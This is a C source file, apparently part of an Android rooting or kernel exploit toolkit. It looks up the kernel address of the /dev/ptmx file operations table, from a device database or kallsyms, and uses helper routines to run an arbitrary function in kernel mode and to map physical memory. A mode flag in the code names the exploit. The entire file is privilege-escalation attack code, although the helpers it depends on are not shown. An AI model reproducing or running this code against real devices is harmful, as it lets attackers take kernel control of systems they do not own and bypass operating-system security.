#include "device_database/device_database.h"
#include "fops_handler.h"
#include "ptmx.h"

#define PTMX_DEVICE "/dev/ptmx"

static unsigned long int
get_ptmx_fops_address(void)
{
  unsigned long int address;

  address = device_get_symbol_address(DEVICE_SYMBOL(ptmx_fops));
  if (address) {
    return address;
  }

  if (kallsyms_exist()) {
    address = kallsyms_get_symbol_address("ptmx_fops");
    if (address) {
#ifdef HAS_SET_SYMBOL_ADDRESS
      device_set_symbol_address(DEVICE_SYMBOL(ptmx_fops), address);
#endif /* HAS_SET_SYMBOL_ADDRESS */

      return address;
    }
  }

  return 0;
}

bool ptmx_run_in_kernel_mode(bool (*function)(void *), void *user_data)
{
  unsigned long int ptmx_fops_address;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  return fops_run_in_kernel_mode((void *)ptmx_fops_address, PTMX_DEVICE, FOPS_RUN_BY_KERNEL_MEMORY, function, user_data);
}

bool ptmx_map_memory(unsigned long int map_address, unsigned long int physical_address, unsigned long int size)
{
  unsigned long int ptmx_fops_address;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  return fops_map_physical_memory((void *)ptmx_fops_address, PTMX_DEVICE, FOPS_RUN_BY_EXPLOIT, map_address, physical_address, size);
}

bool ptmx_unmap_memory(unsigned long int map_address, unsigned long int size)
{
  return fops_unmap_physical_memory(map_address, size);
}
